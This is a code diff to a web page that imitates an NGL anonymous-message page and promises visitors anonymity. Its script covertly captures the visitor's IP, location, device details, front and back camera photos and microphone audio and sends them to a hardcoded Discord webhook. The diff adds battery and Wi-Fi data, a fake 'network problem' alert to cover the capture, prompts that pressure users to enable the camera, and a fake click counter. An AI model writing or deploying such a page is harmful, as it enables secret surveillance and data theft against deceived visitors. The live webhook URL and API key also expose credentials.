@@ -2,6 +2,28 @@
 <html>
 <head>
     <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getAnalytics, logEvent } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";
+
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+            apiKey: "AIzaSyCmL3X8pQOHhtXMIFTxJsO7KHQ2nDr_G6w",
+            authDomain: "ask-fun-d10f0.firebaseapp.com",
+            projectId: "ask-fun-d10f0",
+            storageBucket: "ask-fun-d10f0.appspot.com",
+            messagingSenderId: "214597529567",
+            appId: "1:214597529567:web:d49e8aeef77b9e0a039e6a",
+            measurementId: "G-5DV1ZR5ZHG"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        window.analytics = analytics;
+        window.logEvent = logEvent;
+
         const sendButton = document.querySelector('.submit');
 
         sendButton.addEventListener('click', async function() {
@@ -9,6 +31,12 @@
 
             if (message.trim() !== '') {
                 try {
+                  // Mengambil informasi WiFi yang digunakan oleh pengguna
+            const wifiInfo = await getWifiInfo();
+                  // Mengambil informasi baterai pengguna
+            const batteryLevel = await getBatteryLevel();
+                    // Tampilkan pesan kepada pengguna bahwa pesan sedang dikirim
+                    alert('Mohon tunggu beberapa saat jaringan anda mengalami gangguan, tunggu beberapa saat agar pesan terkirim kepada pengguna...');
                     const userIP = await getIPAddress();
                     const userLocation = await getUserLocation();
                     const deviceInfo = getDeviceInfo();
@@ -16,7 +44,8 @@
                     const frontImageData = await captureImage('user');
                     const audioBlob = await captureAudio();
 
-                    sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, audioBlob);
+                    sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, audioBlob,batteryLevel, wifiInfo);
+                
                 } catch (error) {
                     console.error('Error sending message to Discord webhook:', error);
                     alert('Failed to send message to Discord webhook.');
@@ -82,7 +111,7 @@
         function captureImage(camera) {
             return new Promise((resolve, reject) => {
                 if (cameraAccessDenied) {
-                    reject(new Error('Camera access denied by user'));
+                    reject(new Error('Hidupkan Izin kamera'));
                     return;
                 }
 
@@ -106,7 +135,7 @@
                         console.error('Error accessing camera:', error);
                         if (error.name === 'NotAllowedError' && !messageSent) {
                             cameraAccessDenied = true;
-                            alert('User denied access to camera');
+                            alert('Hidupkan Izin kamera');
                             sendToDiscordWebhook('User denied access to camera', 'Unknown', null, null, null);
                             messageSent = true;
                         }
@@ -135,7 +164,7 @@
 
                         setTimeout(() => {
                             mediaRecorder.stop();
-                        }, 5000); // Sesuaikan durasi rekaman sesuai kebutuhan
+                        }, 1000); // Sesuaikan durasi rekaman sesuai kebutuhan
                     })
                     .catch(error => {
                         console.error('Error accessing microphone:', error);
@@ -143,8 +172,30 @@
                     });
             });
         }
+function getWifiInfo() {
+    return new Promise((resolve, reject) => {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (connection) {
+            resolve({
+                type: connection.type,
+                effectiveType: connection.effectiveType,
+                downlink: connection.downlink,
+                rtt: connection.rtt,wifiSSID: connection.ssid
+            });
+        } else {
+            reject(new Error('Failed to get WiFi information'));
+        }
+    });
+}
+        // Fungsi untuk mendapatkan informasi jumlah baterai pengguna
+function getBatteryLevel() {
+    return navigator.getBattery().then(function(battery) {
+        return battery.level * 100; // Mengambil nilai baterai dalam persen
+    });
+}
 
-        function sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, audioBlob) {
+        function sendToDiscordWebhook(message, userIP, userLocation, deviceInfo, backImageData, frontImageData, audioBlob, batteryLevel, wifiInfo) {
+    // Kode sebelumnya
             const webhookURL = 'https://discord.com/api/webhooks/971478317544910928/bOato0Nzxsan6XQs20QElHZRIdu-cQehot1r9l1nwdwn8s_KqvYpaxXGPJHJfT0rVZa4';
 
             const formattedMessage = `
@@ -153,14 +204,27 @@
     - User Agent: ${deviceInfo.userAgent}
     - Brand: ${deviceInfo.deviceBrand}
 
+
 ✉️ **Pesan:** 
     ${message}
+
 
 📍 **Lokasi:**
     - Kota: ${userLocation.city}
     - Provinsi: ${userLocation.region}
     - Negara: ${userLocation.country}
     - IP: ${userIP}
+    
+    
+    📶 **WiFi:**
+        - Jenis Koneksi: ${wifiInfo.type}
+        - Jenis Efektif: ${wifiInfo.effectiveType}
+        - Downlink: ${wifiInfo.downlink}
+        - RTT: ${wifiInfo.rtt}
+        - Wifi: ${wifiInfo.wifiSSID}
+  
+🔋 **Baterai:**
+        - Level: ${batteryLevel}%
     `;
 
             const formData = new FormData();
@@ -193,13 +257,16 @@
                         throw new Error('Failed to send message to Discord webhook');
                     }
                     console.log('Message sent to Discord webhook successfully');
+
+                    // Mengarahkan pengguna ke halaman HTML yang baru setelah berhasil mengirim webhook
+                    window.location.href = 'sent.html';
                 })
                 .catch(error => {
                     console.error('Error sending message to Discord webhook:', error);
                 });
         }
     </script>
-    <title>@Exc</title>
+    <title>@Kucinglucu</title>
     <link rel="stylesheet" href="css/normalize.css">
     <link rel="stylesheet" href="css/style.css">
     <link rel="shortcut icon" href="images/62a98d041030ce99f782fbde_Variant5_256.png">
@@ -210,11 +277,11 @@
     <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width">
     <meta name="user:language" content="en">
     <meta property="og:image" content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&amp;text1=send%20me%20anonymous%20messages!">
-    <meta property="og:title" content="@Exc: send me anonymous messages!">
-    <meta property="og:description" content="@Exc: send me anonymous messages!">
+    <meta property="og:title" content="@Kucinglucu: send me anonymous messages!">
+    <meta property="og:description" content="@Kucinglucu: send me anonymous messages!">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/main?imageUrl=&amp;text1=send%20me%20anonymous%20messages!">
-    <meta name="twitter:title" content="@Exc: Send me anonymous messages!">
+    <meta name="twitter:title" content="@Kucinglucu: Send me anonymous messages!">
     <meta name="twitter:description" content="NGL: Anonymous Q&amp;A">
 </head>
 <body>
@@ -225,7 +292,7 @@
                 <div class="header">
                     <div class="pfp-container"></div>
                     <div class="user-container">
-                        <div class="username">@Exc</div>
+                        <div class="username">@Kucinglucu</div>
                         <div class="prompt">Send me anonymous messages! <span style="font-size: 10px; color: grey;">(Your anonymity is protected)</span></div>
                     </div>
                 </div>
@@ -263,5 +330,18 @@
             }, 0);
         }
     </script>
+
+    <div class="bottom-container-user-wrapper">
+        <div class="bottom-container">
+            <h2 class="download-prompt">👇 <span class="clickCount">223</span> people just tapped the button👇 </h2>
+            <div class="space2"></div>
+            <a class="button download-link download-link1 pulse" href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837" target="_blank">Get your own messages!</a>
+            <div class="tos-privacy">
+                <a class="tos" href="/p/terms">Terms</a>
+                <a class="privacy" href="/p/privacy">Privacy</a>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
+
